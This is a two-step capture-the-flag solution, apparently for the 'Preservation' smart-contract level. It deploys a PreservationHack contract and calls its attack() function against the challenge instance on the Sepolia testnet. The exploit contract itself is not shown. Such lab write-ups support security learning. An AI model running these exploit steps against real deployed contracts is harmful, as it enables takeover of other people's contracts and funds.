# Preservation Solution

1) Deploy `PreservationHack`:

```
forge create PreservationHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

2) Call `attack()`:

```
cast send `preservationHackAddress` "attack(address)" `ìnstanceAddress` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
